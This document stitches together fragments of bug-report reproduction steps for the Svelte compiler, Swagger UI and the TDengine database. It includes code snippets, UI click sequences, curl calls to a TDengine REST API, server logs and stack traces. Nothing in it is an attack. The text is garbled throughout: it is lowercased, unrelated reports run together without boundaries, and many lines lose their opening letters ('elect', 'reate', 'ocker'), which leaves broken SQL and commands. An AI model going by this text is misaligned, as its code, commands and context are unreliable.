where `has_outros` became `true` for **parent** node, this `has_outros` generate `current` condition and varibale but not assignment
#l196
</details> thanks!
see this repl; reload the page between each test: i have tested all possible opening sequences, and the bug appears in the following: - 2-3
but not in the following:
- 5-3 my suspicion is that the first tile is the deciding factor, because the bug appears when clicking 2 or 4 first, but not 8 or 5
if you click the second piece before the first piece's slide animation has finished, the bug disappears
(this is easier to reproduce if you increase the animation duration.)
the exceptions started occurring from `v3.13.0` onward
using same repl with older compiler produces expected results (no exceptions):
<script> let store;
``` compile this, and look at the `vars` value in the response
`store` has `referenced: false`.
i left some comments detailing specific things that _must_ occur for the bug to trigger
![image](
open [repl example](
click once on toggle button
slot elements inside element without transition works good
with transition - not
`settimeout` just emulates state change close to transition end.
// any code here - empty is fine too
`component.svelte`:
<script context="module"> import \'./a\';
`compile.js`:
const { readfilesync } = require('fs');
const svelte = require('svelte/compiler'); const source = readfilesync('./component.svelte', 'utf8'); const result = svelte.compile(source, { format: 'cjs',
}); console.log(result);
this started with 3.16, reverting to 3.15 is ok
(minimal example)
<script> let node; (function () { while(false) ; }());
<div bind:this={node}></div>
produces `guard is not defined`.
see [repl]( (it does work on 3.15.0).
note that the `bind:this` is actually needed to trigger this
it's probably a visibility issue with the guard and an anonymous function?
<script> export let store
</script> <div class="{$store?\'a\':\'b\'}"></div>
```
see #3912 and #4008 for examples of code that we should disallow.
<div>hey</div> <style> div { font-size: 200%; color: red; }
the first line `a a` shows that the initial value of the array is `['a']`.
the second line `b` shows that the value of the array inside the slot is `['b']`.
the last line `a b` is unexpected
it shows that the value of the array is still `['a']` yet the each block is referencing the array from the slot, `['b']`.
[repl](
click the button expected: the number of "val"\'s on the screen increases, actual: no change
_this throws a compilation error but should output the `item.label`._
<input list="list">
<datalist id="list"> {#each items as item} <option>{item.label}</option> {/each}
</datalist>
``` _this compiles but renders poorly._ ```
<input list="list">
<datalist> {#each items as item} <option value="{item}">{item.label}</option> {/each}
</datalist>
``` _this renders correctly but you need to maintain some sort of label -> item lookup if that's even possible._
<input list="list">
<datalist> {#each items as item} <option value="{item.label}"></option> {/each}
</datalist>
<script> let props = { a: 1, b: 2, }
<i {...props}>what?</i>
go to
add a line like `import 'leftpad';` to the default `<script>` tag
click the icon for "download zip file"
```html
<script> let props = { type: 'text' } let value ='foo' let disabled = false let readonly = false
<div> example a: attribute is readonly="false"<br> <input {...props} bind:value {disabled} {readonly}>
</div> <div> example b: the readonly attribute is omitted<br> <input type="text" bind:value {disabled} {readonly}>
repl 1 with bug:
repl 2 working without slot default:
<script> import foo, { bar } from 'baz';
with local variables, it works as expected:
s1 subscribe
s1 unsubscribe
s2 subscribe
s2 unsubscribe
s1 subscribe
``` with a component prop, it does not:
s1 subscribe
s1 subscribe
s1 unsubscribe
s2 subscribe
``` if `<h1>outer $s = {$s}</h1>` is commented out, no subscribe/unsubscribe occurs when the button is clicked
extra unsubscribe statements appear in the console when editing the code when the old component is unmounted.
create a store
subscribe to it in component a
create an element with ``out:fade`` in component a
destroy component a and trigger a store update before the animation has completed
result: component a never got destroyed.
[repl](
[repl](
create a `subcom.svelte` and add this code: ```html
<p>{bar}</p> <script>
export let foo
const { bar } = foo export let baz
``` now in `app.svelte` add this code: ```html
<h1>syntax related error</h1> <subcom {foo} {baz} /> <script>
import subcom from './subcom.svelte' const foo = { bar: 1 }
const baz = {}
``` you should see the error
to fix the error just change `subcom.svelte` to: ```html
<p>{bar}</p> <script>
export let baz
export let foo
const { bar } = foo
compile the above, and look at the invalid code that's generated.
can be reproduced in repl: ```
import { writable } from 'svelte/store'
let ref = writable(null)
</script> <h1 bind:this={$ref}>hello</h1>
<i>{$ref ? $ref.innerhtml : ''}</i>
- remove debug, it compiles properly
- remove the inner loop, and it compiles properly
- debug is not at fault here, because in my project, the `index` is no longer passed onto nested loops which breaks my code.
(see ssr js output)
made a small repl:
or try `{1 === 1}` in your code.
[
here's a couple of examples the issue:
there is a comment in the fieldset.svelte component indicating how to remove the {...props} from being adding props to the component
removing that will make reactivity work again
to see it work properly, you can set this to version 3.6.7
<script> let toggle = false; function _toggleme() { if (toggle = !toggle) { console.log(toggle); } else { console.log(toggle); } } </script> <button on:click={_toggleme}>click</button> <span class="text {toggle ? "red" : "blue"}"> text </span>
check out this minimal repl - in safari (12.1.2), select the input control in the middle and make any sort of edit
notice how the cursor jumps to the end of the input control.
look at the code produced in this repl: you can see the error in the js-output in line 71.
reproducible in repl: ```
const arr = [1, 2, 3]
</script> <div> {#each arr as item ((() => item)())} {item} {/each}
``` this error can be worked around by passing arguments into the iffe: ```
const arr = [1, 2, 3]
</script> <div> {#each arr as item (((item) => item)(item))} {item} {/each}
repl
go to <
click the three things it tells you to click
see that the blue and purple (if and else parts of the if/else in app.svelte) are both showing
if you remove `transition:slide` from `scaffold.svelte` the problem is no longer there.
can be reproduced in repl: ```
<script> let name = 'world'; let something; export let prop = (something = 1);
</script> <h1>hello {name}!</h1>
``` you get the `todo this should not happen` message at repl bottom
i was actually using rollup and preprocessed svelte files with babel to get `optional chaining` syntax support
i got this "todo" error when i wrote something like `export let x = a?.b`
i eventually discovered that the optional chaining will transpile into code with in expression assignments
the assignment is what actually killed svelte compiler.
[repl](
clicking the `refactoredbutton` causes the internal state of `refactoredbutton` and `value` to go out of sync.
[repl repro]( open that repl link, switch to the "js output" tab, and switch from dom to ssr mode to see the issue
const app = create_ssr_component(($$result, $$props, $$bindings, $$slots) => { let $style; let style = readable("foo"); $style = get_store_value(style); $style = get_store_value(style); return `${escape($style)}`;
was on my latest xiaomi trying to edit as soon as i type a character the editor deletes it.
simple reflection of props fails in 3.7.1
<div> <span class="a/{42}"/>
``` this needs to be compiled in production mode, since elements are never converted to static html in dev mode
<script> let name = 'world'; let toggle = false;
</script> <input type='checkbox' bind:checked={toggle}> <h1 data-foo={toggle ? name : null}>hello {name}!</h1>
have a component with the the html for a paypal donate button
it will always generate the error when you compile
but, since it's a warning, i still get the processed files okay.
please paste the following code into
<script> let foo = 'foo<br>bar';
</script> <p>{@html foo}<br>baz</p>
[this repl demo]( contains the bug, though it's not directly visible since it's ssr-only
the offending code is this: ```js return `${$$slots.default ? $$slots.default() : ``}`;
``` `$$slots.default` corresponds to this: ```js return `${validate_component(foo, 'foo').$$render($$result, {}, {}, { default: ({ id }) => ` ${validate_component(bar, 'bar').$$render($$result, { thing: things[id] }, {}, {})} ` })}`
``` this fails with > typeerror: cannot destructure property `id` of 'undefined' or 'null'.
[voila](
```
<script> import { of } from 'rxjs'; let myobs = of([1, 2, 3, 4, 5]); myobs = of([6, 7, 8, 9, 10]);
</script> {$myobs}
v3.6.3, it's smooth:
v3.6.4, it's glitchy:
note that it doesn't matter which child has the transition on it
it's always going to be the last child glitching out.
open yaml at editor and try to view xml response sample
you can delete the `examples` part and it will render it in xml.
open the operation
click try me out
leave the values as their original values then click execute
the required field now turns red
select true in the required field then click execute
the required field is still red
select false in the required field
select true in the required field then click execute
this now works
sending data with multipart/form-data
go to
click on '/pet add a new pet' (2nd endpoint)
click on 'model' in the `body` parameter in console
go to #/pet/addpet
open the 'add a new pet to the store' (it should be opened by default using the link above)
click the `try it out` button to activate the ui
replace the body with this json (notice the `,` in the tags section)
{ "id": 0, "category": { "id": 0, "name": "string" }, "name": "doggie", "photourls": [ "string" ], "tags": [ { "id": 0, "name": "string" , } ], "status": "available"
click the `execute button`
in the schema above, a `user` has a `name`, an autogenerated `id` which is marked as `readonly` (i.e
appears in responses but cannot be set) and a `password` which is marked as `writeonly` (i.e
can be set but does not appear in responses)
in the ui it shows the schema for the get request as: ```
[ { "id": "string", "name": "string" }
``` and the schema for the post request as: ```
{ "name": "string", "password": "string"
``` so far so good
but for the callback (which is nested inside the post request) it shows the schema as: ```
{ "name": "string", "password": "string"
go to
go to swagger ui page
select multipart/form-data as the content-type in the request body
upload file to be sent in the request
click on 'execute'
go to a path in a tag roup
click on the path item
see error: the path item will disappear and reappear further down the page under a new `default` tag group.
the path item under the `default` tag will sit and spin.
using the api definition above, execute the request with the default values, and examine the curl command.
go to and paste the definition avove.
in the ui, expand the operation and click "try it out".
switch the request media type to `multipart/form-data`.
switch the request media type back to `application/x-www-form-urlencoded`.
click "execute".
examine the generated curl command.
install `swagger-ui-react`
use `swaggerui` component with petshop api url
`git clone `
`docker build -t jakubmalek/swagger-ui-example:latest .`
`docker run -p 8080:8080 --name swagger-ui-example -d -it jakubmalek/swagger-ui-example:latest`
open ` ` in the browser
click on "authorize" button
go to [swagger editor](
copy example code to editor
open `post /user` api and click `try it out` button
the scenario for basic auth:
call secured endpoint from swagger-ui list and got proper unauthorized information
click authorize button
set login and password
call secured endpoint and got the proper result from swagger-ui list
click authorize button
click logout button
call the same endpoint from points 1 and 4, but there should be information like unauthorized, but still got the proper result expected only for logged user
- i have tried to set at point 7 the same username but wrong password - still didn't get unauthorized information.
- when set another wrong username at point 7 finally got proper unauthorized information.
try to load swagger ui and use yaml above
copy a swagger spec to `/usr/share/nginx/html/specs/` inside the `swaggerapi/swagger-ui:v3.25.3` image
copy a `swagger-config.yaml` to `/usr/share/nginx/html/swagger-config.yaml` with the following content: ``` --- urls: - name: spec url: specs/<spec file name> ```
add `env config_url=swagger-config.yaml` to the dockerfile (or set it while running the container)
open the swagger ui in the browser
try to load swagger ui using the openapi.json above
configure an operation parameter as shown in the json above.
- yarn && ng serve - click authorize you can find this error in console
paste the above swagger file into the editor and see the rendered result.
start the dev server with the config from above
go to #/pet%2flist
observe that the pet operation is not unfolded
- open the example linked above
![01]( - change the content type before clicking try, then change back, all works as expected.
![02]( - click try
![03]( - change content type - note that it doesn't match the yaml
![04]( - change to a form type - works correctly
![05]( - change to a non form type - works correctly
![06]( - change to another non form type - not working correctly
![07](
* click "try it out"
* click "execute" the spinner keeps spinning, and there\'s an error in the console: ![fastapi - swagger ui - google chrome_030]( the console error is: ```
error: required parameter param is not provided at index.js:3893 at array.foreach (<anonymous>) at object.jn [as buildrequest] (index.js:3863) at actions.js:415 at object.dispatch (utils.js:137) at dispatch (<anonymous>:1:28545) at bindactioncreators.js:3 at wrap-actions.js:33 at object.r (system.js:174) at object.executerequest (system.js:461)
go to #/pet/addpet
click on try it out
change the `body` to any invalid json string
attempt to execute the request
load the ui.
click on basepath and switch to the empty base path
got to get /todos and click try it
click execute
look at the generated curl statement.
see that is uses the wrong server url
use definitions added tho this issue
open swaggerui
extend address with "?urls=[]"
change inital swaggerui configuration inside index.html to something like:
swaggerui({ urls: [ ]
run docker container with `docker run -d -p 80:8080 -e url= -e validator_url=null swaggerapi/swagger-ui`
browse to the local swagger ui using something other than `localhost` (e.g
` `)
the validator badge displays as a broken image with a broken link
this is on a local development environment so i cannot share a link right now, but any suggestions of things to try, parameters to add, etc - would be appreciated
if someone knows how also, when i do the markup for a link on one of my other pages, it always adds target=_blank which i do not want because i am linking around the same site, how can i get rid of that? is it possible that having the urls.primaryname in my url is causing a problem? all the working examples do not have that.
load yaml file
implement a `parametermacro` when using an openapi 3.0 spec
notice the function fires, but it does nothing.
fire up ui with it pointing at the petstore api.
point ui to a http url with no `schemes` value defined.
try it out.
render yaml with type: string and format: date
open an example value in the browser
copy the `working` json to
expand `[get] /teams/{teamname}/{environment}` route.
examine the code 200 example response or schema.
copy the `broken` json to
expand `[get] /teams/{teamname}/{environment}` route.
examine the code 200 example response or schema.
try to expand /pstate/classes/purchaseorder/objects/query
go to editor.swagger.io
authorize with oauth2 authorization code flow
press log out
try to authorize again
view a document with an operation that (a) has a very long path and (b) has a non-empty summary or a summary with a single very long word (like a namespace)
note the 'squished' appearance of the operation summary or the path
see screenshot
it looks worse the longer the operation summary is.
change anything in `swagger-config.yaml` and check `ui.getsystem().getconfigs()`.
use a spec that has a spaces in the tags, e.g
initialise the swagger setting:
docexpansion: 'none',
link to an operation that uses a tag with a space in it (e.g
#/store%2520space)
the operation is not "scrolled to".
visit #/pet/uploadfile and execute a request after having selected a file with either an invalid extension (e.g., foo.abc) or potentially a good extension that is unrecognized (such as nuget's 'foo.nupkg')
the generated curl command includes a blank type (-f "file=...;type=") which causes the curl to be invalid.
the first model in the swagger 3.20 ui and try get /products (clocks).
open the swagger-ui in a browser with the `configurl` query parameter
refresh the page to verify the swagger-ui will load either the pet store example or the `urls` openapi definition.
write a request interceptor that modifies the url of loadspec requests
load the page
wait for spec to load
see that the spec selector box has the old url
you can use this docker-compose file to launch the service with the same options i'm using:
version: \'3\' services: swagger-ui: image: swaggerapi/swagger-ui ports: - "8080:8080" environment: - config_url= - api_urls=[{"name":"v2","url":" "},{"name":"v3","url":" "}]
``` once swagger ui is launched you will see a blank page is loaded
you can manually explore an api doc by putting in the url and it will use the settings from the config.json file as defined
you can alternate back and forth removing one or the other and see that the settings are working independently, just not together.
create request body where schema is in separate file
make sure that one of the property of that object is required
launch swagger ui
start the dev server with the config from above
go to ` #/pet/post_pet`
observe that the pet operation is not unfolded
go to
paste yaml from the above.
click on 'post /test' -> callbacks -> 'post
: swagger-ui.js:8 uncaught typeerror: cannot read property 'get' of undefined at parameterrow.r.setdefaultvalue (swagger-ui.js:8) at new parameterrow (swagger-ui.js:8) at u._constructcomponentwithoutowner (reactcompositecomponent.js:295) at u._constructcomponent (reactcompositecomponent.js:282) at u.mountcomponent (reactcompositecomponent.js:185) at object.mountcomponent (reactreconciler.js:43) at reactdomcomponent.mountchildren (reactmultichild.js:234) at reactdomcomponent._createinitialchildren (reactdomcomponent.js:701) at reactdomcomponent.mountcomponent (reactdomcomponent.js:520) at object.mountcomponent (reactreconciler.js:43)
open
hit the "initialize" button
observe oas3 badge disappearing
describe a path as written above
copy te yaml provided here
open the swagger ui and preview the changes
use content type application/octet-stream for a response
open swagger-ui page and look at response example value
see this jsfiddle:
try it out on get /pets 4
observe generated curl request
now comment requestinterceptor return statement and uncomment the `return req;` line
repeat step 2 through 5 (this is expected behaviour)
go to
click on 'load swagger'
click on it again
go to 'foo/ try it out'
click on 'wrongoption'
select 'correctoption'
click on 'execute'
see request url
start internet explorer 11
go to #/user/createuserswitharrayinput
example value is ` [ null ] `
click on model
model is ` [ { } ]`
click on any route with required parameter
/pet/{petid}
click "try it out" button
specify pet id
click on "execute" button - pet id was removed, petid field is red
ui doesn't send any http request
click on the "pet" resource
click on the "/pet" operation
the operation is opened, the browser url changes to #/pet/addpet
open this url in a new brower tab
the deep link works: operation post "/pet" is opened
go back to 2, get the url of the "/pet" operation
the (incorrect) url is #/**operations/**pet/addpet
open this url in a new brower tab
the deep does not work: operation post "/pet" won\'t be opened
#/default/get_foo
load above yaml
indent `inventoryitem` so it is inline with `type: object`
models component crashes with error
open the attachment, you can find it after opening the html file
1.download the attachment
2.extract the zip
3.open the index.html
go to path definition and see the responses
enter a description with a linebreak.
render with swaggerui
go to
expand /pet/findbystatus
make sure response content type is application/xml
example value for status code 200 has "xml example cannot be generated"
go to
paste in the swagger/openapi definition yaml above.
look a the rendered swagger-ui on the right.
the json has a bug
it has excess output that looks like it's coming from immutablejs.
go to [
click on the authorize popup
scroll down to the api key section
type a text in the textbox
click on authorize
without closing the popup, click on logout and again authorize.
the apikey is authorized even though there is nothing in the textbox
go to ` `.
paste in the above yaml file.
reload browser
pasted yaml data should still be present.
click "authorize" and enter dummy data in dialog.
click "authorize" in dialog and note the url used in attempting to fetch a token.
close the "authorize" dialog.
change to server url (to, say, ' `)
note that it changes appropriately in the `server` dropdown.
repeat steps 5 and 6 and note that the url is not the new one
note that it works correctly after doing a browser refresh after the server url has been changed.
start the swagger petstore demo **locally**
navigate to
scroll down to the modal-section 4
click on a modal-element (e.g
open your browsers dev-console
go to `sql` get and execute query without header `x-irest-conn` (`x-irest-conn` is an optional header).
try a get with a header value for `x-irest-conn`
remove the value for `x-irest-conn` the request now is executed with empty `x-irest-conn` 4
`-h "x-irest-conn: "` this is seen in the curl command.
initial request works fine
problem arises once the header field is reset to empty.
open public/bad.html
click to expand get request
click "try it out"
enter a value in the "limit" field of the form and submit
see that the "limit" field has been cleared
open the swagger-ui page.
click [get] /test bar.
click the "try it out" button.
testheader input field doesn\'t show the default value "test-value".
go to ` `
open your developer tools
select the first operation of the 'pet store' section with the element inspector
take a look at the html markup of this element:
<div class="opblock opblock-post" id="operations-pet store-addpet">...</div>
go to editor.swagger.io and upload the swagger above
in the gui pane notice that description, content type data is rendered outside the table.
testmysql
taos> describe testmysql ; field | type | length | note |
================================================================================= ts | timestamp | 8 | | age | int | 4 | | age2 | int | 4 | | name | binary | 100 | |
query ok, 4 row(s) in set (0.000228s)
taos> select * from testmysql; ts | age | age2 | name |
======================================================================================= 2020-10-03 10:00:00.000 | 1 | 2 | null | 2020-11-04 15:40:33.113 | 1 | 3 | null | 2020-11-04 17:38:18.282 | 1 | 3 | null | 2020-11-04 17:49:58.712 | 1 | 3 | nihao | 2020-11-04 17:51:19.619 | 1 | 4 | nihao | 2020-11-04 17:51:56.155 | 1 | 4 | nihao | 2020-11-04 19:40:46.365 | 1 | 3 | null | 2020-11-05 00:40:55.338 | 1 | 3 | null | 2020-11-05 16:47:34.159 | 2 | 2 | abc | 2020-11-05 16:47:39.043 | 2 | 3 | abc | 2020-11-05 16:47:45.519 | 2 | 4 | abcd |
query ok, 11 row(s) in set (0.259796s) taos> select * from testmysql where age2 <> 3 and age2 <> 2; ts | age | age2 | name |
======================================================================================= 2020-11-04 15:40:33.113 | 1 | 3 | null | 2020-11-04 17:38:18.282 | 1 | 3 | null | 2020-11-04 17:49:58.712 | 1 | 3 | nihao | 2020-11-04 17:51:19.619 | 1 | 4 | nihao | 2020-11-04 17:51:56.155 | 1 | 4 | nihao | 2020-11-04 19:40:46.365 | 1 | 3 | null | 2020-11-05 00:40:55.338 | 1 | 3 | null | 2020-11-05 16:47:39.043 | 2 | 3 | abc | 2020-11-05 16:47:45.519 | 2 | 4 | abcd |
query ok, 9 row(s) in set (0.031976s)
elect percentile(value, 20) from openfalcon._load_5min;
![image](
![image](
taos.cfg
timezone asia/shanghai (cst, +0800)
locale en_us.utf-8
charset utf-8 docker -v /usr/share/zoneinfo/:/usr/share/zoneinfo/ docker linux 2
docker run -d -p 6030:6030 -p 6035:6035 -p 6041:6041 -p 6030-6040:6030-6040/udp -v /root/tdengine/etc/:/etc/taos -v /root/tdengine/logs/:/var/log/taos -v /root/tdengine/db:/var/lib/taos -v /usr/share/i18n/:/usr/share/i18n/ -v /usr/share/zoneinfo/:/usr/share/zoneinfo/ tdengine/tdengine
ocker dengine
docker top aos aos connect failed, reason: unable to establish connection.
ocker 11/02 06:43:36.747515 dnd error status rsp is received, error:unable to establish connection
11/02 06:43:36.878771 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:36.878813 dnd error user:monitor, auth msg received from mnodes, error:unable to establish connection
11/02 06:43:37.087362 mon error failed to connect to database, reason:unable to establish connection
11/02 06:43:37.752464 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:37.752492 dnd mnode ep list for peer is changed, numofeps:2 inuse:1
11/02 06:43:37.752503 dnd mnode index:0 192.168.155.46:6030
11/02 06:43:37.752523 dnd mnode index:1 192.168.155.44:6030
11/02 06:43:37.752537 dnd error status rsp is received, error:unable to establish connection
11/02 06:43:37.883792 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:37.883833 dnd error user:monitor, auth msg received from mnodes, error:unable to establish connection
11/02 06:43:38.090595 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:38.090633 dnd error user:monitor, auth msg received from mnodes, error:unable to establish connection
11/02 06:43:38.757363 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:38.757390 dnd mnode ep list for peer is changed, numofeps:2 inuse:1
11/02 06:43:38.757402 dnd mnode index:0 192.168.155.46:6030
11/02 06:43:38.757421 dnd mnode index:1 192.168.155.44:6030
11/02 06:43:38.757432 dnd error status rsp is received, error:unable to establish connection
11/02 06:43:39.092412 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:39.092450 dnd error user:monitor, auth msg received from mnodes, error:unable to establish connection
11/02 06:43:39.764188 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:39.764213 dnd mnode ep list for peer is changed, numofeps:2 inuse:1
11/02 06:43:39.764224 dnd mnode index:0 192.168.155.46:6030
11/02 06:43:39.764233 dnd mnode index:1 192.168.155.44:6030
11/02 06:43:39.764245 dnd error status rsp is received, error:unable to establish connection
11/02 06:43:40.097781 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:40.097823 dnd error user:monitor, auth msg received from mnodes, error:unable to establish connection
11/02 06:43:40.767482 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:40.767507 dnd mnode ep list for peer is changed, numofeps:2 inuse:1
11/02 06:43:40.767518 dnd mnode index:0 192.168.155.46:6030
11/02 06:43:40.767527 dnd mnode index:1 192.168.155.44:6030
11/02 06:43:40.767545 dnd error status rsp is received, error:unable to establish connection
11/02 06:43:41.102518 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:41.102642 dnd error user:monitor, auth msg received from mnodes, error:unable to establish connection
11/02 06:43:41.772438 rpc warn dnd-c (nil), too many redirects, quit
11/02 06:43:41.772491 dnd mnode ep list for peer is changed, numofeps:2 inuse:1
11/02 06:43:41.772510 dnd mnode index:0 192.168.155.46:6030
11/02 06:43:41.772520 dnd mnode index:1 192.168.155.44:6030
11/02 06:43:41.772530 dnd error status rsp is received, error:unable to establish connection 4
docker
docker run --name tdengine2.0.6.0 -d -e tz=asia/shanghai -v /etc/taos/taos.cfg:/etc/taos/taos.cfg -v /etc/taos/data:/var/lib/taos -v /etc/taos/log:/var/log/taos -p 6030:6030 -p 6035:6035 -p 6041:6041 -p 6030-6040:6030-6040/udp -h node01 192.168.155.100:8082/tdengine:v2.0.6.0 5
ocker .0.6.0
run 'taos' to connect taosd which has super table;
type any sql statement to select * from a super table;
curl -u root:taosdata -d 'create database if not exists ksh;' 192.168.2.66:6041/rest/sql
curl -u root:taosdata -d 'create table if not exists ksh.table1(datatime timestamp ,dataquality binary(256), temperature int,humidity int,hair int)tags (objectid binary(256),objectname binary(256),projectname binary(256),location binary(256));' 192.168.2.66:6041/rest/sql
3.curl -u root:taosdata -d \'create table if not exists ksh.table1_object1 using ksh.table1 tags("1","object1","project01","xian");\' 192.168.2.66:6041/rest/sql
4.curl -u root:taosdata -d \'create table if not exists ksh.table1_object2 using ksh.table1 tags("1","object1","project01","xian");\' 192.168.2.66:6041/rest/sql
5.curl -u root:taosdata -d \'insert into ksh.table1_object1 (datatime,dataquality,temperature,humidity,hair) values ("2020-10-23 17:27:44.137","192",642,642,632) ksh.table1_object2(datatime,dataquality,temperature,humidity,hair) values("2020-10-23 17:27:44.137","192",628,626,623); \' 192.168.2.66:6041/rest/sql 6.curl -u root:taosdata -d \'drop table if exists ksh.table1;\' 192.168.2.66:6041/rest/sql 7
curl -u root:taosdata -d 'create table if not exists ksh.table1(datatime timestamp ,dataquality binary(256), temperature int,humidity int,hair int)tags (objectid binary(256),objectname binary(256),projectname binary(256),location binary(256));' 192.168.2.66:6041/rest/sql
8.curl -u root:taosdata -d \'create table if not exists ksh.table1_object1 using ksh.table1 tags("1","object1","project01","xian");\' 192.168.2.66:6041/rest/sql
9.curl -u root:taosdata -d \'create table if not exists ksh.table1_object2 using ksh.table1 tags("1","object1","project01","xian");\' 192.168.2.66:6041/rest/sql
10.curl -u root:taosdata -d \'insert into ksh.table1_object1 (datatime,dataquality,temperature,humidity,hair) values ("2020-10-23 17:27:44.137","192",642,642,632) ksh.table1_object2(datatime,dataquality,temperature,humidity,hair) values("2020-10-23 17:27:44.137","192",628,626,623); \' 192.168.2.66:6041/rest/sql 11. {"status":"error","code":1536,"desc":"invalid table id"} 12. aos ql 13.
oredump #0 in __memmove_avx_unaligned_erms () from /lib64/libc.so.6
#1 in mnodesavequerystreamlist (pconn= , phbmsg= ) at /root/tdengine/src/mnode/src/mnodeprofile.c:305
#2 in mnodeprocessheartbeatmsg (pmsg= ) at /root/tdengine/src/mnode/src/mnodeshow.c:257
#3 in mnodeprocessread (pmsg= ) at /root/tdengine/src/mnode/src/mnoderead.c:83
#4 in dnodeprocessmnodereadqueue (param= ) at /root/tdengine/src/dnode/src/dnodemread.c:173
#5 in start_thread () from /lib64/libpthread.so.0
#6 in clone () from /lib64/libc.so.6
mkdir build
nm build/lib/libsync.a | grep main you can find main() function from tarbitrator.c is included into the library.
or 000 hreadexcutor
024 00 allerrunspolicy
4.tdengine 000 1000
5. ybatis
import into db000117v1 using voltages tags (beijing.daxing0117,did100117,mid200117,uid300115) (ts,voltagea,voltageb,voltagec) values (?,?,?,?)
import into db000117v2 using voltages tags (beijing.daxing0117,did100117,mid200117,uid300115) (ts,voltagea,voltageb,voltagec) values (?,?,?,?)
import into db000117v3 using voltages tags (beijing.daxing0117,did100117,mid200117,uid300115) (ts,voltagea,voltageb,voltagec) values (?,?,?,?)
import into db000117v4 using voltages tags (beijing.daxing0117,did100117,mid200117,uid300115) (ts,voltagea,voltageb,voltagec) values (?,?,?,?)
import into db000117v5 using voltages tags (beijing.daxing0117,did100117,mid200117,uid300115) (ts,voltagea,voltageb,voltagec) values (?,?,?,?)
import into db000117v6 using voltages tags (beijing.daxing0117,did100117,mid200117,uid300115) (ts,voltagea,voltageb,voltagec) values (?,?,?,?)
import into db000117v7 using voltages tags (beijing.daxing0117,did100117,mid200117,uid300115) (ts,voltagea,voltageb,voltagec) values (?,?,?,?)
for example, dnodeprocessmnodewritequeue thread and httpaccepthttpconnection thread can call this funciton at the same time.
dengine-server-2.0.5.1
dengine-client-2.0.5.1-windows-x64.exe
<dependency> <groupid>com.taosdata.jdbc</groupid> <artifactid>taos-jdbcdriver</artifactid> <version>2.0.4</version> </dependency>
package com.vcare.taos.demo; import com.zaxxer.hikari.hikariconfig;
import com.zaxxer.hikari.hikaridatasource; import java.sql.connection;
import java.sql.resultset;
import java.sql.sqlexception;
import java.sql.statement;
import java.util.hashmap; public class hikaricpdemo { public static void main(string[] args) throws sqlexception { hikariconfig config = new hikariconfig(); //config.setdatasourceclassname("com.taosdata.jdbc.tsdbdriver"); config.setjdbcurl("jdbc:taos://192.168.10.234:6030/db"); //jdbc:taos://192.168.10.112:6020/?user=root&password=taosdata config.setusername("root"); config.setpassword("taosdata"); config.setminimumidle(3); //minimum number of idle connection config.setmaximumpoolsize(10); //maximum number of connection in the pool config.setconnectiontimeout(10000); //maximum wait milliseconds for get connection from pool config.setidletimeout(60000); // max idle time for recycle idle connection //config.setconnectiontestquery("describe db.dn"); //validation query config.setvalidationtimeout(3000); //validation query timeout hikaridatasource ds = new hikaridatasource(config); //create datasource connection connection = ds.getconnection(); // get connection statement statement = connection.createstatement(); // get statement //query or insert try { hashmap hm = null; boolean islowercase = true; string sqlstr="select * from t where ts>=\'2019-07-01 00:00:00\' and ts<\'2019-07-23 00:00:00\'"; resultset rs = statement.executequery(sqlstr); int colcnt = rs.getmetadata().getcolumncount(); while (rs.next()) { hm = new hashmap(); for (int i = 1; i <= colcnt; i++) { if(islowercase){ hm.put(rs.getmetadata().getcolumnname(i).tolowercase(),getstring(rs.getstring(i))); }else{ hm.put(rs.getmetadata().getcolumnname(i),getstring(rs.getstring(i))); } system.out.println("=================================================================:"); if(islowercase){ system.out.println(rs.getmetadata().getcolumnname(i).tolowercase()+ "::" + rs.getstring(i)); }else{ system.out.println(rs.getmetadata().getcolumnname(i)+ "::" + rs.getstring(i)); } system.out.println(rs.getmetadata().getcolumnname(i)+ "::" + rs.getstring(i)); system.out.println("=================================================================:"); } } } catch (exception ex) { ex.printstacktrace(); } finally { } connection.close(); // put back to conneciton pool } public static string getstring(string getstringvalue) throws sqlexception { return getstringvalue == null ? "" : getstringvalue; }
5. ava.sql.sqlexception: tdengine error: unable to resolve fqdn
6. osts qdn p osts
execute statements in `taos`, detailed as in `screenshots` hereafter.
create database crash;
create table thermo_data ( ts timestamp, temperature float ) tags ( dev_id nchar(17) );
insert into atable using thermo_data tags ("fb:cd:99:33:12:ef") values (now, 222.3) ;
select * from thermo_data where dev_id = "fb:cd:99:33:12:ef";
build tests/examples/c/apitest.c
program hangs on line:
code = taos_validate_sql(taos, "select * from meters");
reate table qch_cq.device_data_up_sum as select sum(ai_pick_udata) from qch_test.st_device_data_up interval(1m) sliding(30s) order by time desc;
ch_test 0
ch_cq reate table qch_cq.device_data_up_sum as select sum(ai_pick_udata) from qch_test.st_device_data_up interval(1m) sliding(30s) order by time desc;
treamid tream
![image](
elect * from device_data_up_sum order by time desc;
b error: unable to establish connection
![image](
reate table qch_cq.device_data_up_sum_30s as select sum(ai_pick_udata) from qch_test.st_device_data_up interval(1m);
elect ai_pick_udata from qch_test.st_device_data_up order by time desc limit 10;
aos how tables;
nable to establish connection
how streams
trmeaid 1:1 3:1
sorry that i can't reproduce it, but it crash every one or two day, and the jvm crash report still the same: ```bash
# a fatal error has been detected by the java runtime environment:
# sigsegv ( ) at pc= , pid=7046, tid=
# jre version: java(tm) se runtime environment (8.0_261-b12) (build 1.8.0_261-b12)
# java vm: java hotspot(tm) 64-bit server vm (25.261-b12 mixed mode linux-amd64 compressed oops)
# problematic frame:
# c [libtaos.so.2.0.4.0+ ] rpccleanconncache+ # <----- !!! here !!!
# failed to write core dump
core dumps have been disabled
to enable core dumping, try "ulimit -c unlimited" before starting java again
# if you would like to submit a bug report, please visit:
#
2 ava dbc
3 ava hile
4 i_updownnvalopovt
8 ava
reate table if not exists md5_8d4543fd6f3554276020431e89a1372a using _net_if_all_tcpnum tags("cnsz22pl0123","all")
nexpected generic error in mnode
bl
aos select first(price),last(price) from tbl interval(1h);
create stable: `create table stb_acc (ts timestamp, point_value double) tags(domain binary(30), station binary(30), dev_type binary(30), dev_id binary(30), point_name binary(30), data_flag binary(20));`
insert data:
